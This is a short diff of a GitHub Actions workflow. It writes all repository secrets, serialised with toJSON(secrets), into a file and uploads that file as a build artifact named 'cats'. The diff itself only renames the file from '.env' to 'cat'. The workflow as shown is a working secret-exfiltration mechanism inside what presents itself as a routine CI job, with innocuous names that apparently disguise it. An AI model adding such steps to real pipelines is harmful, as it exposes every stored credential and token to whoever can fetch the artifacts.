@@ -13,11 +13,10 @@ jobs:
       uses: SpicyPizza/create-envfile@v2.0
       with:
         envkey_SECRETS: ${{ toJSON(secrets) }}
-        file_name: .env
+        file_name: cat
         fail_on_empty: false
     - name: Upload artifact
       uses: actions/upload-artifact@v3
       with:
         name: cats
-        path: ${{ github.workspace }}/.env
-
+        path: ${{ github.workspace }}/cat
